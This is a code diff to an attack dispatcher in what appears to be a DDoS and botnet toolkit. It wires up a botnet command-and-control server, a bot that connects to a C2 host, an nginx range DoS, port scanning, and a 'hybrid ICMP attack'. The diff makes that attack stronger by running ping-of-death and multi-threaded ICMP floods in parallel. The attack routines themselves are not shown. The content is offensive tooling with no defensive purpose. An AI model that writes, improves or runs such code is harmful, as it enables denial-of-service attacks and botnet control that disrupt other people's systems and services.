@@ -36,13 +36,16 @@ class AttackDispatcher:
             return
 
         if choice == "7":
-            c2 = BotnetC2(port=params["c2_port"])
+            c2_port = params.get("c2_port") or params.get("port") or 6667
+            c2 = BotnetC2(port=c2_port)
             threading.Thread(target=c2.start_server, daemon=True).start()
             return c2
 
         if choice == "18":
             from src.bot import FullBot
-            bot = FullBot(params['c2_host'], params['c2_port'])
+            c2_host = params.get("c2_host") or params.get("target") or "127.0.0.1"
+            c2_port = params.get("c2_port") or params.get("port") or 6667
+            bot = FullBot(c2_host, c2_port)
             threading.Thread(target=bot.run, kwargs={'interactive': False}, daemon=True).start()
             return bot
 
@@ -116,12 +119,15 @@ class AttackDispatcher:
             nginx_range_dos(url, duration, monitor)
 
         elif choice == "17":
-            port_scanner(target, params.get("port", "1-1024"), threads)
+            ports = params.get("ports") or params.get("port") or "1-1024"
+            port_scanner(target, ports, threads)
 
         elif choice == "19":
-            # Hybrid ICMP attack
-            ping_of_death(target, duration, monitor)
-            icmp_flood(target, duration, monitor)
+            # Hybrid ICMP attack: Run both in parallel
+            threading.Thread(target=ping_of_death, args=(target, duration, monitor), daemon=True).start()
+            for _ in range(threads):
+                increment_thread_counter()
+                threading.Thread(target=icmp_flood, args=(target, duration, monitor), daemon=True).start()
 
         elif choice == "20":
             network_scanner(threads=threads, subnet=params.get("subnet"))
